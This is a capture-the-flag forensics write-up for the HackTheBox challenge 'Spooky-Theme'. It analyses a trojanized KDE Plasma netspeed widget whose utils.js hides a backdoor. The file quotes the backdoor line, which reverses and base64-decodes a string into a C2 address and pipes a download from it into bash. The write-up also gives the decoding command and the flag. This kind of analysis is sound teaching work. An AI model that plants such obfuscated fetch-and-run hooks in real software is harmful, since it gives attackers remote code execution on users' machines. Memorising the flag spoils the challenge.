---
title: "Spooky-Theme"
ctf: "HackTheBox"
date: 2026-06-02
category: forensics
difficulty: very-easy
flag_format: "HTB{...}"
---

# Spooky-Theme

## Summary

A KDE Plasma global theme named "Otto" came bundled with a trojanized Netspeed Widget plasmoid. The widget's `utils.js` contained a backdoor that reversed and base64-decoded an embedded string to derive a C2 address, then curled it for remote code execution. The embedded string decoded directly to the flag.

## Solution

### Step 1: Examine the Plasmoid

The challenge provided a `plasma/` directory with a desktop theme, look-and-feel, and one custom plasmoid: `org.kde.netspeedWidget`. The widget's utility script at `contents/code/utils.js` defined two data sources:

```javascript
const NET_DATA_SOURCE =
    "awk -v OFS=, 'NR > 2 { print substr($1, 1, length($1)-1), $2, $10 }' /proc/net/dev";

const PLASMOID_UPDATE_SOURCE = 
    "UPDATE_URL=$(echo 952MwBHNo9lb0M2X0FzX/Eycz02MoR3X5J2XkNjb3B3eCRFS | rev | base64 -d); curl $UPDATE_URL:1992/update_sh | bash"
```

The second source was registered in `main.qml:55` as a connected source to the `executable` engine, meaning Plasma would execute it as a shell command.

### Step 2: Decode the Embedded String

The obfuscated string was reversed then base64-decoded:

```bash
echo '952MwBHNo9lb0M2X0FzX/Eycz02MoR3X5J2XkNjb3B3eCRFS' | rev | base64 -d
```

This revealed the flag directly — the C2 hostname was the flag itself.

## Flag

```
HTB{pwn3d_by_th3m3s!?_1t_c4n_h4pp3n}
```
